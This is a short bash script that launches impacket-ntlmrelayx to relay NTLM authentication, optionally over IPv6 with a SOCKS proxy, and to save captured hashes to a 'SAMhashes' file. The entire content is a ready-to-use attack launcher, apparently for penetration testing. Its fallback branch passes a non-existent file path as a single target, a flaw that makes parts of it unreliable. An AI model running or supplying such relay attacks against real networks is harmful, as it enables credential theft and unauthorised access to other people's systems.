#!/bin/bash
if [ -f "/RESULTS/$1" ]; then
    impacket-ntlmrelayx -l /RESULTS -of /RESULTS/SAMhashes -6 -tf "/RESULTS/$1" -socks -smb2support
else
    impacket-ntlmrelayx  -l /RESULTS -of /RESULTS/SAMHashes -t "/RESULTS/$1" -smb2support
fi
